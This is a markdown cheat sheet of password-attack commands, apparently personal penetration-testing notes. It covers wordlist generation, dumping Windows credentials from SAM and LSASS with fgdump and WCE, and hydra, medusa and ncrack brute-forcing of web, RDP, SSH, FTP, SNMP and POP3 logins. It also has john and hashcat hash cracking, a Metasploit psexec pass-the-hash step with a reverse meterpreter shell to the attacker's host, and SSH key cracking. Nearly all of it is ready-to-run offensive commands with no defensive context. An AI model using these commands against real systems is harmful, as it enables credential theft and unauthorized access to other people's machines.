- [Password generator](#Password-generator)
- [Windows](#Windows)
- [Password cracking](#Password-cracking)
- [Password hash cracking](#Password-hash-cracking)
- [Pass the hash](#Pass-the-hash)
- [SSH key cracking](#SSH-key-cracking)
- [tools](#tools)
 
# Password generator

Crunch: 
  - is a wordlist generator where you can specify a standard character set or a character set you specify.

- crunch 6 6 1234567890ABCDE -o <file.txt>
  - ***6*** min length
  - ***6*** max length
  - ***1234567890ABCDE*** charset
  - ***o*** seve result in file
 
- crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
  - ***f*** dictionary path
  
- special chars
  - @ lower case alpha char
  - , upper case alpha char
  - % numeric charset
  - ^ special char include space
  
Cewl:
- cewl <victim_www_url> -d [num] -m [num] -w [file.txt]
------------------------------------------------------------------------------------------------------------------------
# Windows  

- pwdump fgdump
MS Windows store hased user password in the ***Security account manager (SAM)***
pwdump and fgdump inject a DLL containning the hash dumping code into the ***Local Security Authority Subsystem (LSASS)***

***- c:\> fgdump.exe ***
***- c:\> type 127.0.0.1.pwdump ***

- WCE
- WCE can steal NTLM credentails from memory and dump clear text password
***- c:\> WCE -w ***
------------------------------------------------------------------------------------------------------------------------
# Password cracking

- HTTP
```
medusa -h [url] -u [user_name] -p [password_file.txt] -M http
- hydra [target_url] -l [user_name] -P [password_file] https-post-form 
/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```
- RDP
```
ncrack -vv --user [user_name] -P [password_file.txt] rdp://[victim_ip]
```
- SNMP 
``` 
hydra -P [password-file.txt] -v [victim_ip] snmp
```
- SSH 
```
hydra -l [user_name] -P [password_file.txt] [victim_ip] ssh
```
- FTP 
```
hyrda -L [user_file] -p [password] [victim_ip] ftp
```
- POP3 
```
hyrda -L [user_file] -P [password_file.txt] [victim_ip] -s [victim_port] -t 50 -I pop3

Usefull flag
- -vV : verbose mode
- -e nsr : login as password or login as password in reversed order etc
- -t : threads
```
------------------------------------------------------------------------------------------------------------------------
# Password hash cracking

- Hash identifier
```
usage: 

hash-identifier
```
- MD5
```
john --format=raw-md5 --wordlist=rockyou.txt [hash.file]
```
- SHA1
```
john --format=raw-sha1 --wordlist=rockyou.txt [hash.file]
```
- SHA256
```
john --format=raw-sha256 --wordlist=rockyou.txt [hash.file]
```
- SHA512
```
john --format=raw-sha512 --wordlist=rockyou.txt [hash.file]
```
- krb5tgs 
```
hashcat -m 13100 --force -a 0 hashes.file passwords.txt 

john --format=krb5tgs --wordlist=passwords.txt hashes.file
```
- AS REP
```
john --wordlist=passwords_kerb.txt hashes.file

hashcat -m 18200 --force -a 0 hashes.file passwords.txt
```
------------------------------------------------------------------------------------------------------------------------
# Pass the hash

- Dump the contents of local SAM file, which contains the hashed(NTLM) passwords for every local account on the machine
```
meterpreter> hashdump
```

- psexec via msfconsole
```
msf> search psexec

msf> use exploit/windows/smb/psexec

msf> set payload widnows/meterpreter/reverse_tcp
msf> set LHOST <your_ip>
msf> set LPORT <your_port>
msf> set RHOST <target_ip>
msf> set SMBPass e.g (e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c)
msf> exploit
```

------------------------------------------------------------------------------------------------------------------------

# SSH key cracking

### Cracking encrypted private key
- Tool: ssh2john.py
```
ssh2john.py encrypted-private-key > private-key.john
```

- Tool: john
```
john --wordlist=/usr/share/wordlists/rockyou.txt private-key.john
```

### Unencrypted copy of the key
- Tool: openssl
```
openssl rsa -in encrypted-private-key -out id_rsa
```

- Tool: chmod
```
chmod 600 id_rsa
```

### Login with id_rsa
```
ssh -i id_rsa user-name@<ip>
```

------------------------------------------------------------------------------------------------------------------------
# tools
- https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
